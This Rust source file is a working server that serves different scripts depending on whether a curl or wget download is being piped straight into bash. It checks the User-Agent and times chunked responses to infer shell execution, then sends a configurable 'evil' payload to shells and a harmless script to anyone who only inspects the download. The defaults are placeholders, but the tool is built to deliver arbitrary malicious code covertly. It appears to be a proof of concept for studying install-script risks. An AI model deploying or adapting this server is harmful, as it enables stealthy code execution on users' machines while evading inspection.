use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::time::Duration;

use std::cmp::Ordering;
use std::env;
use std::fs::File;
use std::str::FromStr;
use std::sync::Arc;
use std::thread;
use std::time::Instant;

/*
good:
Variance = 0.000000024579828288862217, Maximum Jump = 0.00013909699999999997
bad:
Variance = 0.00000015643485087709332,  Maximum Jump = 0.0002735080000000001
*/

const HTTP_SUCCESS_HEADERS: &[u8] = b"HTTP/1.1 200 OK\r
Server: nginx\r
Content-Type: text/plain; charset=us-ascii\r
Transfer-Encoding: chunked\r
Connection: keep-alive\r\n\r\n";

const END: &[u8] = &[];

struct EvilServer {
    wait: Vec<u8>,
    good: Vec<u8>,
    evil: Vec<u8>,
    min_variance: f64,
    min_jump: f64,
    socket_timeout: Option<Duration>,
    padding: Vec<u8>,
    max_padding: u8,
}

unsafe impl Send for EvilServer {}

impl EvilServer {
    fn new(
        wait: Vec<u8>,
        good: Vec<u8>,
        evil: Vec<u8>,
        min_variance: f64,
        min_jump: f64,
        buffer_size: usize,
        max_padding: u8,
        secs: u64,
    ) -> EvilServer {
        EvilServer {
            wait,
            good,
            evil,
            min_variance,
            min_jump,
            max_padding,
            socket_timeout: match secs {
                0 => None,
                x => Some(Duration::from_secs(x)),
            },
            padding: vec![0u8; buffer_size],
        }
    }

    fn handle_client(&self, stream: TcpStream) -> std::io::Result<usize> {
        stream.set_read_timeout(self.socket_timeout)?;
        let curl_or_wget = handle_read(&stream);
        if curl_or_wget.is_none() {
            println!("HTTP request malformed");
            return Ok(0);
        }

        stream.set_write_timeout(self.socket_timeout)?;
        stream.set_nodelay(true)?;

        let mut stream = stream;

        stream.write(HTTP_SUCCESS_HEADERS)?;

        send_chunk(&stream, &self.wait)?;

        if !curl_or_wget.unwrap() {
            println!("curl/wget not detected, returning good");
            send_chunk(&stream, &self.good)?;
            return send_chunk(&stream, END);
        }

        let mut timing = vec![0.0f64; self.max_padding as usize];
        let now = Instant::now();

        for x in 0..self.max_padding {
            send_chunk(&stream, &self.padding)?;
            //timing[x as usize] = now.elapsed().as_float_secs(); // nightly
            let elapsed = now.elapsed();
            timing[x as usize] =
                (elapsed.as_secs() as f64) + (elapsed.subsec_nanos() as f64) / 1_000_000_000f64;
        }

        //println!("timing {:?}", timing);

        let mut max_index = 0;
        let mut max = -1.0;
        for x in 0..(self.max_padding - 1) {
            timing[x as usize] = timing[(x + 1) as usize] - timing[x as usize];
            // todo: remove this unwrap, maybe do away with floats?
            if max.partial_cmp(&timing[x as usize]).unwrap() == Ordering::Less {
                max_index = x as usize;
                max = timing[max_index];
            }
        }
        // now set max_index to 0 so it doesn't calculate into mean() below
        timing[max_index] = 0.0;

        //println!("timing calc {:?}", timing);
        //println!("max {:?}", max);
        //println!("max_index {:?}", max_index);

        let variance = std_deviation(&timing, &max_index).powi(2);

        println!("Variance = {}, Maximum Jump = {}", variance, max);

        if variance > self.min_variance && max > self.min_jump {
            println!("Execution through bash detected - sending bad payload :D");
            send_chunk(&stream, &self.evil)?;
        } else {
            println!("Sending good payload :(");
            send_chunk(&stream, &self.good)?;
        }

        send_chunk(&stream, END)
    }
}

fn handle_read(mut stream: &TcpStream) -> Option<bool> {
    let mut buf = [0u8; 1024];
    println!("----------------------------------------");
    match stream.read(&mut buf) {
        Ok(_) => {
            let req_str = String::from_utf8_lossy(&buf).to_lowercase();
            println!("{}", req_str);
            return Some(
                req_str.contains("user-agent: curl") || req_str.contains("user-agent: wget"),
            );
        }
        Err(e) => println!("Unable to read stream: {}", e),
    }
    None
}

fn send_chunk(mut stream: &TcpStream, response: &[u8]) -> std::io::Result<usize> {
    stream.write(format!("{:x}\r\n", response.len()).as_bytes())?;
    stream.write(response)?;
    stream.write(b"\r\n")
}

fn mean(data: &[f64], count: f64) -> f64 {
    let sum = data.iter().sum::<f64>();
    sum / count
}

fn std_deviation(data: &[f64], exclude_index: &usize) -> f64 {
    let count = (data.len() - 1) as f64;
    let data_mean = mean(data, count);
    let variance = data
        .iter()
        .enumerate()
        .filter(|(index, _)| index != exclude_index)
        .map(|(_, value)| (data_mean - value).powi(2))
        .sum::<f64>()
        / count;

    variance.sqrt()
}

fn read_file(filename: &str) -> std::io::Result<Vec<u8>> {
    let mut file = File::open(filename)?;
    let mut ret = Vec::new();
    file.read_to_end(&mut ret)?;
    Ok(ret)
}

struct Args<'a> {
    args: &'a Vec<String>,
}

impl<'a> Args<'a> {
    fn new(args: &'a Vec<String>) -> Args {
        Args { args }
    }
    fn get_str(&self, index: usize, def: &'a str) -> &'a str {
        match self.args.get(index) {
            Some(ret) => ret,
            None => def,
        }
    }
    fn get<T: FromStr>(&self, index: usize, def: T) -> T {
        match self.args.get(index) {
            Some(ret) => match ret.parse::<T>() {
                Ok(ret) => ret,
                Err(_) => def, // or panic
            },
            None => def,
        }
    }
    fn get_file(&self, index: usize, def: &[u8]) -> Vec<u8> {
        match self.args.get(index) {
            Some(filename) => match read_file(filename) {
                Ok(ret) => ret,
                Err(_) => def.iter().cloned().collect(), // or panic
            },
            None => def.iter().cloned().collect(),
        }
    }
}

fn main() {
    let raw_args = env::args().collect();
    let args = Args::new(&raw_args);
    if args.get_str(1, "").contains("-h") {
        println!(
            "usage: {} [-h] [wait.sh, sleep 3] [good.sh, echo \"Hello there :)\"] \
             [evil.sh, echo \"r00t1ng y0ur b0x0rs >:)\"] [host, 127.0.0.1:5555] \
             [min_variance, 0.1] [min_jump, 1.0] [buffer_size, 87380] [max_padding, 32] \
             [socket_timeout, 10]",
            args.get_str(0, "curl_bash")
        );
        return;
    }
    let host = args.get_str(4, "0.0.0.0:5555");

    let evil_server = Arc::new(EvilServer::new(
        args.get_file(1, b"#!/bin/sh\nsleep 3\n"),
        args.get_file(2, b"echo \"Hello there :)\"\n"),
        args.get_file(3, b"echo \"r00t1ng y0ur b0x0rs >:)\"\n"),
        args.get(5, 0.1),
        args.get(6, 1.0),
        args.get(7, 87380),
        args.get(8, 32),
        args.get(9, 10),
    ));

    println!(
        "min_variance: {}, min_jump: {}, socket_timeout: {:?}, buffer_size: {}, max_padding: {}",
        evil_server.min_variance,
        evil_server.min_jump,
        evil_server.socket_timeout,
        evil_server.padding.len(),
        evil_server.max_padding
    );

    let listener = TcpListener::bind(&host).unwrap();
    println!("Listening for connections on {}", &host);

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                let evil_server = evil_server.clone();
                thread::spawn(move || {
                    evil_server
                        .handle_client(stream)
                        .expect("error handling connection")
                });
            }
            Err(e) => {
                println!("Unable to connect: {}", e);
            }
        }
    }
}
